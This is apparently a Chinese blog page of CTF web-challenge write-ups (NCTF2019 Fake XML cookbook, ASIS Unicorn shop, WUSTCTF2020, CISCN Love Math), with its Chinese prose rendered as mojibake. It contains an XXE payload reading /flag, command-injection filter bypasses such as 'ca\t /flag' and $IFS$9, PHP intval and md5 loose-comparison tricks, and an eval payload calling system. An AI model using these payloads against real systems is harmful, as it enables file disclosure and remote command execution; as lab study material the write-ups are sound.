<p>å¯ä»¥ç»•è¿‡ï¼Œæ³¨æ„è¦æ±‚æ˜¯é‡‡ç”¨postçš„æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>))</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡äº†å¥½å¤šå‘½ä»¤</p>
<p>ls   â€”&gt;  dir</p>
<p>æˆ‘ä»¬å‘ç°ç¦ç”¨äº†tac nl more less head tail cat od ç­‰ä¸€äº›å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹çš„å…³é”®å­—ï¼Œæ³¨æ„çœ‹åé¢çš„|\|\\|ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨phpä¸­æ­£åˆ™è¿‡æ»¤åæ–œæ è¦å†™å››ä¸ª\å­—ç¬¦ï¼Œå› ä¸ºä¼šç»è¿‡ä¸¤æ¬¡è§£æï¼Œä¸€æ¬¡phpè§£æå™¨çš„è§£æï¼Œå¦ä¸€æ¬¡æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„è§£æã€‚\\ï¼Œå…ˆç»è¿‡phpçš„è§£ææˆ\ï¼Œå†ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„è§£ææˆ\ï¼Œä½†æ˜¯å‰é¢åˆå¤šäº†ä¸€ä¸ª\ï¼Œç»è¿‡phpçš„è§£ææˆ\ï¼Œ|è¿™ä¸ªå­—ç¬¦åœ¨æ­£åˆ™ä¸­æ˜¯ä¿ç•™å­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥è½¬ä¹‰ï¼Œå†ç»è¿‡æ­£åˆ™çš„è§£ææ—¶\ä¼šä¸åé¢çš„|ä¸€èµ·è§£ææˆ|ï¼Œé—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸€å—ï¼Œæ•´ä¸ªæ¥çœ‹ï¼Œå…ˆç»è¿‡phpçš„è§£ææˆ||\|ï¼Œå†ç»è¿‡æ­£åˆ™çš„è§£ææˆ|||ï¼Œæ‰€ä»¥æœ€ååŒ¹é…çš„æ˜¯|\è€Œä¸æ˜¯\ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨åæ–œæ ç»•è¿‡</p>
<p>cmd=dir%20/ å‘ç°flag</p>
<p>â‘¢cmd=ca\t%20/flag å¾—åˆ°flag</p>
<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/Whaocai/article/details/119321047">https://blog.csdn.net/Whaocai/article/details/119321047</a></p>
<h1 id="NCTF2019-Fake-XML-cookbook1"><a href="#NCTF2019-Fake-XML-cookbook1" class="headerlink" title="[NCTF2019]Fake XML cookbook1"></a>[NCTF2019]Fake XML cookbook1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		alert(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        url: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).text(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œä¿¡æ¯ä¼šè¢«ä¼ è¾“åˆ°doLogin.phpï¼Œæ‰“å¼€æ­¤urlç„¶åæŠ“åŒ…</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">penson</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;penson;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>penson<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ct fä¸­flagæ–‡ä»¶ä¸€èˆ¬åœ¨æ ¹ç›®å½•ä¸‹æˆ–è€…/var/www/html/</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><a href="https://xz.aliyun.com/t/6887#toc-5">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<h1 id="ASIS-2019-Unicorn-shop1"><a href="#ASIS-2019-Unicorn-shop1" class="headerlink" title="[ASIS 2019]Unicorn shop1"></a>[ASIS 2019]Unicorn shop1</h1><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>  <a href="https://www.compart.com/en/unicode/U+10130">â€œğ„°â€ U+10130 Aegean Number Sixty Thousand Unicode Character (compart.com)</a></p>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>

<p>æç¤ºutf-8å¾ˆé‡è¦</p>
<p>â€œé‡‘é’±ä»æ¥ä¸ä¼šè®©äººå¿«ä¹ï¼Œä¹Ÿä¸ä¼šï¼Œå®ƒçš„æœ¬è´¨ä¸­æ²¡æœ‰ä»»ä½•ä¸œè¥¿å¯ä»¥äº§ç”Ÿå¹¸ç¦ã€‚ä¸€ä¸ªäººæ‹¥æœ‰çš„è¶Šå¤šï¼Œäººä»¬æƒ³è¦çš„å°±è¶Šå¤šã€‚</p>
<p>æç¤ºé’±å¯èƒ½å‡ºäº†é—®é¢˜ï¼Œæµ‹æ‰ä¹°æœ€åä¸€ä¸ªï¼Œå¹¶ä¸”é’±è¦å¤§ä¸€äº›ï¼Œè¾“å…¥thousand,æ‰¾ä¸€ä¸ªå¤§ä¸€äº›çš„ï¼Œç„¶åæŠŠ0xæ”¹ä¸º%</p>
<p>å¯¹äºéASCIIå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ASCIIå­—ç¬¦é›†çš„è¶…é›†è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¯¹äºUnicodeå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º0xE4 0xB8 0xAD 0xE6 0x96 0x87ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°â€%E4%B8%AD%E6%96%87â€ã€‚</p>
<h1 id="WUSTCTF2020-æœ´å®æ— å1"><a href="#WUSTCTF2020-æœ´å®æ— å1" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å1"></a>[WUSTCTF2020]æœ´å®æ— å1</h1><h2 id="intval-md5-md5-md5-lsâ€“-gt-dir-catâ€“-gt-tac"><a href="#intval-md5-md5-md5-lsâ€“-gt-dir-catâ€“-gt-tac" class="headerlink" title="intval   $md5==md5($md5)     lsâ€“&gt;dir   catâ€“&gt;tac"></a>intval   $md5==md5($md5)     lsâ€“&gt;dir   catâ€“&gt;tac</h2><p>ç”¨dirsearchæ‰«æï¼Œå¾—åˆ°robots.txtæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‡ºç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸€ä¸ªå‡çš„flagï¼Œæ²¡æœ‰åˆ«çš„æ–¹æ³•äº†ï¼ŒæŠ“åŒ…å‘åŒ…ï¼Œç„¶åçœ‹åˆ°äº†æç¤ºæ–‡ä»¶ï¼Œæ‰“å¼€ä¹‹åå¾—åˆ°äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;é´æˆœç¬‰ç¼å¿”å‰°é—‚å¯¸æ¹…æµœå—™æ¹…é´æˆ æ®‘é”å†²å§æ¾¹ï¿½, æ¶“å¶†æ§¸é¯å´‡æ¹…éƒå •æ£¿, é™î…æ§¸é¯å……ç¬‰ç¼å¿”å‰°é—‚ï¿½, ç’â•€ç¶˜é­ãƒ©äº¾é´æˆ£ç¹ƒå¯°æ¥ç˜®æµ£çŠ²ã‚½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é–²æˆ¦æŒ¶ç‘™ï½…å–…æ¶“å¶„ç°¡ç»Œèœ‚æ±‰é¨å‹¬æ¹°ç’ã„©æ£¶æ£°ï¿½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;é¯å†²åŸŒæ©æ¬é‡œCTFeré·å®åŸŒflagéšï¿½, é°ç†¸ç¸ºå¨‘æ›¢æµ‚, ç’ºæˆå¹“æ¶“æ»„ç·¶å®€ï¿½, éµå¥ç«´ç€¹å •î˜µé˜ï¿½, é¶å©‚å¸¹ç”¯å £æ¡¨é‘å“„å¹“, é‘·î„ç¹éæè¢±æ¶“î…å¬éµå¬ªçš¬é‘¿ï¿½, éŠæç«´é‰îˆ›æšç‘å‘¯æ«§é–°ï¿½, é‘·æ‘ç˜œéˆå¤äº¾, é’î‚¢î„Ÿçå¿”æ¯š.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;é´æˆ£åˆ€ç»±Ñƒæˆé‰ãƒ¦åœé¨å‹¯å­é‘²å¤‹æ¹…é™ï¿½, æµ æ ¨å¢¦æµœå—•é‡œé¢ä½ƒç˜½, é¶å©ç²¬æ¶“â‚¬ç€¹è·ºç•¨éºæ‘åŸŒæµœå—›æ½ªå¨²ï¿½&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;é¯å†²åŸŒæ©æ¬“å™·, é´æˆå–ç€¹ç‚¶â‚¬å±¾î‚¾é±ï¿½, éˆå¤æŒ¶æµœè™¹æ®‘è¹‡î‚¡ç®°å¯°â‚¬å¯°â‚¬çè¾¨æ§¸æ©æ¬ç®é¨å‹¬æ¹¸ç€¹ç‚´æ£¤é—ï¿½, æ¶“æ—€çŸé•ï¿½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¹‡î‚¢åŸŒé—ˆç‚´åºŠæµœï¿½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">é˜å©šæ½ªå¨²æ’æƒ‚</span><br></pre></td></tr></table></figure>

<p> $num = $_GET[â€˜numâ€™];</p>
<p>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</p>
<p> ä»¤num=1e10,â€™1e10â€™=1   â€˜1e10+1â€™&gt;2021</p>
<p>*<em>intval</em>è·å–æ•°æ®çš„æ•´æ•°å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> $md5==md5($md5)  0e215962017</p>
<p>$IFS$9ä»£æ›¿ç©ºæ ¼</p>
<p><a href="http://101.200.53.102:23333/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=ls">http://101.200.53.102:23333/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=ls</a></p>
<p>catè¢«è¿‡æ»¤äº†ï¼Œç”¨tacä»£æ›¿</p>
<h1 id="CISCN-2019-åˆèµ›-Love-Math1"><a href="#CISCN-2019-åˆèµ›-Love-Math1" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math1"></a>[CISCN 2019 åˆèµ›]Love Math1</h1><h2 id="c-GETa-amp-a-system-amp-b-cat-flag"><a href="#c-GETa-amp-a-system-amp-b-cat-flag" class="headerlink" title="?c=$_GETa&amp;a=system&amp;b=cat flag"></a>?c=$_GET<a href="$_GET%5Bb%5D">a</a>&amp;a=system&amp;b=cat flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°<br>ä¾‹å¦‚ï¼š$function = â€œsayHelloâ€;$function();</p>
<p>scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br>dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br>hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚<br>var_dump() ï¼šå‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>readfile() å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚<br>è¯­æ³•ï¼šreadfile(filename,include_path,context)</p>
<p>è¿™é“é¢˜çš„æ ¸å¿ƒå°±æ˜¯base_convertæ„é€ hex2binå‡½æ•°</p>
<p>æˆ‘ä»¬å…ˆæ¥å†™ä¸‹æˆ‘ä»¬è¦æ„é€ çš„payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

